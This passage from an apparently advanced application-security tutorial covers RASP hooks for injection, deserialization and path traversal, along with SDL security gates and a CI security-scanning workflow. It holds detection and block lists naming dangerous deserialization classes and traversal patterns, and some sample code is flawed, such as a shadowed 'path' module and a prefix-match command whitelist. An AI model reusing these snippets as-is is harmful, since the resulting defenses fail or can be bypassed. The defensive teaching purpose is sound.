    indicators.push('sql_comment')
    score += 0.3
  }

  // Check if query came from user input (context aware)
  if (context.inputSource === 'user_request') {
    score += 0.3
  }

  return { score, indicators }
}
```

**2. Command Injection Prevention**

```javascript
rasp.onShellExecution((command, context) => {
  // Block any shell execution with user input
  if (context.hasUserInput) {
    rasp.block({
      reason: 'Command injection attempt',
      command,
      userInput: context.userInput
    })
    throw new Error('Command execution blocked')
  }

  // Allow safe commands
  const whitelist = ['/usr/bin/git', '/usr/bin/convert']
  if (whitelist.some(cmd => command.startsWith(cmd))) {
    return rasp.allow()
  }

  // Block all others
  rasp.block({ reason: 'Unauthorized command', command })
  throw new Error('Command not whitelisted')
})
```

**3. Deserialization Attack Prevention**

```javascript
rasp.onDeserialize((data, context) => {
  // Detect dangerous classes being deserialized
  const dangerousPatterns = [
    'Runtime',
    'ProcessBuilder',
    'ObjectInputStream',
    'javax.script',
    'Proxy'
  ]

  const serialized = data.toString()

  dangerousPatterns.forEach(pattern => {
    if (serialized.includes(pattern)) {
      rasp.block({
        reason: 'Dangerous deserialization detected',
        pattern,
        data: serialized.substring(0, 100)
      })
      throw new Error('Deserialization blocked')
    }
  })

  return rasp.allow()
})
```

**4. Path Traversal Prevention**

```javascript
rasp.onFileAccess((path, context) => {
  // Normalize path
  const normalized = path.normalize(path)

  // Block path traversal attempts
  if (normalized.includes('..') || normalized.includes('~')) {
    rasp.block({
      reason: 'Path traversal attempt',
      path,
      normalized
    })
    throw new Error('File access blocked')
  }

  // Only allow access to specific directories
  const allowedPaths = ['/var/app/uploads', '/tmp/app']
  if (!allowedPaths.some(allowed => normalized.startsWith(allowed))) {
    rasp.block({
      reason: 'Unauthorized file access',
      path: normalized
    })
    throw new Error('File access blocked')
  }

  return rasp.allow()
})
```

### RASP vs WAF

| Feature | WAF | RASP |
|---------|-----|------|
| **Deployment** | Network perimeter | Inside application |
| **Context** | HTTP requests only | Full application context |
| **False Positives** | Higher (lacks context) | Lower (code-aware) |
| **Performance Impact** | Low (network layer) | Medium (runtime overhead) |
| **Protection Coverage** | Network attacks | Logic flaws, runtime attacks |
| **Bypass Difficulty** | Medium (WAF evasion) | Hard (inside app) |

Use both: WAF for perimeter, RASP for application layer.

## Secure Development Lifecycle (SDL) Integration

Security testing throughout SDLC, not just before release.

### SDL Security Gates

```markdown
# Security Gates by SDLC Phase

## Phase 1: Requirements & Design
### Security Activities:
- [ ] Threat modeling (STRIDE or PASTA)
- [ ] Security requirements defined
- [ ] Data classification completed
- [ ] Privacy impact assessment (if handling PII)
- [ ] Compliance requirements identified

### Gate Criteria:
- Threat model reviewed by security team
- All "Critical" and "High" threats have mitigations
- Security requirements documented in tickets

### Responsible: Security Architect + Product Manager

---

## Phase 2: Development
### Security Activities:
- [ ] Secure coding training completed (annual requirement)
- [ ] IDE security plugins enabled (SonarLint, Snyk)
- [ ] Dependency scanning on every commit
- [ ] Pre-commit hooks (secrets scanning, linting)
- [ ] Security unit tests written

### Gate Criteria:
- No high/critical vulnerabilities in dependencies
- No secrets in code
- Security unit tests passing
- Code review by someone with security training

### Responsible: Developer + Tech Lead

---

## Phase 3: Testing (Pre-Merge)
### Security Activities:
- [ ] SAST (static analysis) in CI/CD
- [ ] Dependency check (OWASP Dependency-Check)
- [ ] Container scanning (Trivy, Anchore)
- [ ] Infrastructure-as-Code scanning (Checkov, tfsec)

### Gate Criteria:
- No critical/high SAST findings (or accepted)
- No vulnerable dependencies (or updated/accepted)
- Container base images up to date
- IaC has no high-severity misconfigurations

### Responsible: CI/CD Pipeline

---

## Phase 4: Testing (Pre-Deploy to Staging)
### Security Activities:
- [ ] DAST (dynamic analysis) against staging
- [ ] Authenticated scanning
- [ ] API security testing (OWASP API Security Top 10)
- [ ] Security regression testing

### Gate Criteria:
- No critical/high DAST findings
- All security regression tests passing
- Pentest findings from previous releases verified fixed

### Responsible: Security Testing Team

---

## Phase 5: Pre-Production Release
### Security Activities:
- [ ] Penetration testing (annually or for major features)
- [ ] Red team review (for critical systems)
- [ ] Security sign-off from security team
- [ ] Incident response plan updated
- [ ] Security runbook documented

### Gate Criteria:
- Penetration test completed (if required)
- All critical/high pentest findings remediated
- Security team sign-off obtained
- Monitoring and alerting configured

### Responsible: Security Team Lead

---

## Phase 6: Production & Operations
### Security Activities:
- [ ] Runtime protection enabled (RASP, WAF)
- [ ] Security monitoring and alerting active
- [ ] Vulnerability management (continuous scanning)
- [ ] Incident response ready
- [ ] Security chaos experiments running

### Gate Criteria:
- Security monitoring dashboards showing healthy
- No unacknowledged high-severity alerts
- Backup and recovery tested within 30 days

### Responsible: Security Operations Team

---

## Phase 7: Post-Release
### Security Activities:
- [ ] Bug bounty program monitoring
- [ ] Security metrics tracking
- [ ] Lessons learned from incidents
- [ ] Security debt tracking and remediation

### Gate Criteria:
- Bug bounty reports responded to within SLA
- Security metrics within acceptable ranges
- Post-incident reviews completed

### Responsible: Security Operations + Leadership
```

### Automating Security Gates

```yaml
# .github/workflows/security-gates.yml
name: Security Gates

on: [push, pull_request]

jobs:
  security-gate-dev:
    name: Development Security Gate
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      # Secrets scanning
      - name: TruffleHog Secrets Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD

      # Dependency scanning
      - name: Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          path: '.'
          format: 'ALL'
          args: >
            --failOnCVSS 7
            --enableRetired

      # SAST
      - name: SonarCloud Scan
        uses: SonarSource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        with:
          args: >
            -Dsonar.qualitygate.wait=true

      # Infrastructure as Code scanning
      - name: Checkov IaC Scan
        uses: bridgecrewio/checkov-action@master
        with:
          directory: infrastructure/
          framework: terraform,cloudformation
          output_format: sarif
          download_external_modules: true

  security-gate-pre-deploy:
    name: Pre-Deploy Security Gate
    runs-on: ubuntu-latest
    needs: security-gate-dev
    if: github.ref == 'refs/heads/main'
    steps:
      # DAST
      - name: OWASP ZAP DAST Scan
        uses: zaproxy/action-full-scan@v0.4.0
        with:
          target: 'https://staging.example.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'

      # Container scanning
      - name: Trivy Container Scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'example/app:${{ github.sha }}'
          format: 'sarif'
          severity: 'CRITICAL,HIGH'

  security-sign-off:
    name: Security Team Sign-Off Required
    runs-on: ubuntu-latest
    needs: [security-gate-dev, security-gate-pre-deploy]
    if: github.event_name == 'pull_request' && contains(github.event.pull_request.labels.*.name, 'security-critical')
    steps:
      - name: Request Security Review
        uses: actions/github-script@v6
        with:
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: '🔒 **Security Review Required**\n\nThis PR is labeled as security-critical. Requesting review from @security-team.'
            })

            github.rest.pulls.requestReviewers({
              pull_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              team_reviewers: ['security-team']
            })
```

## What You've Mastered

You can now:

**Run Comprehensive Security Programs**:
- Bug bounty programs that attract skilled researchers and find real vulnerabilities
- Red team exercises simulating advanced adversaries
- Purple team collaboration improving both offense and defense

**Advanced Threat Analysis**:
- STRIDE-per-Element for granular threat discovery
- Attack trees visualizing attack paths and prioritizing defenses
- PASTA for risk-centric threat modeling

**Proactive Security**:
- Security chaos engineering verifying defenses work continuously
- RASP providing runtime protection with application context
- SDL integration making security part of every development phase

## Related Deep-Water Topics

**Within Phase 04-Testing**:
- [Unit & Integration Testing - Deep Water](../../unit-integration-testing/deep-water/index.md): Contract testing, mutation testing, property-based testing
- [Accessibility Testing - Deep Water](../../accessibility-testing/deep-water/index.md): WCAG AAA, cognitive accessibility, assistive technology
- [Compliance Validation - Deep Water](../../compliance-validation/deep-water/index.md): SOC 2 Type II, FedRAMP, ISO 27001 certification

**Future Topics** (not yet available):
- Zero-Trust Architecture: Implementing "never trust, always verify" at scale
- Incident Response: Post-breach forensics, containment, recovery
- Cryptographic Engineering: Designing secure cryptographic systems
- Supply Chain Security: Protecting the software supply chain

---

Security at this level isn't about tools or checklists. It's about systematic thinking: understanding how attackers think, building defenses in depth, and continuously validating those defenses work.

The techniques here are for teams where security is existential - breaches mean business failure. If that's not you, the mid-depth layer probably serves you better.

But when security determines whether your business survives, these patterns provide the rigor and depth needed to defend against serious adversaries.
